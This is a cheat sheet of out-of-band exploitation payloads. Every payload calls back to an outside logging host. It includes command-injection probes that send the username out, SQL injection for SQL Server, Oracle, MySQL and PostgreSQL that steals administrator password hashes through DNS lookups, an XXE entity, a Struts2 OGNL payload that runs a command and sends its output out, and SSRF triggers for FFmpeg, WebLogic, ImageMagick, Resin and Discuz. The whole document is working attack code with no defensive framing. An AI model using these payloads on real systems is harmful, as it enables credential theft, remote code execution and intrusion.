## Command Execution
### i. *nix:

	curl http://ip.port.b182oj.ceye.io/`whoami`
	ping `whoami`.ip.port.b182oj.ceye.io

### ii. windows

	ping %USERNAME%.b182oj.ceye.io

## 0x01 SQL Injection

### i. SQL Server

	DECLARE @host varchar(1024);
	SELECT @host=(SELECT TOP 1
	master.dbo.fn_varbintohexstr(password_hash)
	FROM sys.sql_logins WHERE name='sa')
	+'.ip.port.b182oj.ceye.io';
	EXEC('master..xp_dirtree
	"\\'+@host+'\foobar$"');

### ii. Oracle

	SELECT UTL_INADDR.GET_HOST_ADDRESS('ip.port.b182oj.ceye.io');
	SELECT UTL_HTTP.REQUEST('http://ip.port.b182oj.ceye.io/oracle') FROM DUAL;
	SELECT HTTPURITYPE('http://ip.port.b182oj.ceye.io/oracle').GETCLOB() FROM DUAL;
	SELECT DBMS_LDAP.INIT(('oracle.ip.port.b182oj.ceye.io',80) FROM DUAL;
	SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.ip.port.b182oj.ceye.io',80) FROM DUAL;

### iii. MySQL

	SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\abc'));

### iv. PostgreSQL

	DROP TABLE IF EXISTS table_output;
	CREATE TABLE table_output(content text);
	CREATE OR REPLACE FUNCTION temp_function()
	RETURNS VOID AS $
	DECLARE exec_cmd TEXT;
	DECLARE query_result TEXT;
	BEGIN
	SELECT INTO query_result (SELECT passwd
	FROM pg_shadow WHERE usename='postgres');
	exec_cmd := E'COPY table_output(content)
	FROM E\'\\\\\\\\'||query_result||E'.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\'';
	EXECUTE exec_cmd;
	END;
	$ LANGUAGE plpgsql SECURITY DEFINER;
	SELECT temp_function();
	0x02 XML Entity Injection
	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE root [
	<!ENTITY % remote SYSTEM "http://ip.port.b182oj.ceye.io/xxe_test">
	%remote;]>
	<root/>

## Others

### i. Struts2

	xx.action?redirect:http://ip.port.b182oj.ceye.io/%25{3*4}
	xx.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'whoami'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://ip.port.b182oj.ceye.io/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}

### ii. FFMpeg

	#EXTM3U
	#EXT-X-MEDIA-SEQUENCE:0
	#EXTINF:10.0,
	concat:http://ip.port.b182oj.ceye.io
	#EXT-X-ENDLIST

### iii. Weblogic

	 xxoo.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://ip.port.b182oj.ceye.io/test&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Businesslocation&btnSubmit=Search
	
### iv. ImageMagick

	push graphic-context
	viewbox 0 0 640 480
	fill 'url(http://ip.port.b182oj.ceye.io)'
	pop graphic-context

### v. Resin

	xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://ip.port.b182oj.ceye.io/ssrf

### vi. Discuz

	http://xxx.xxxx.com/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://ip.port.b182oj.ceye.io/xx.jpg[/img]&formhash=xxoo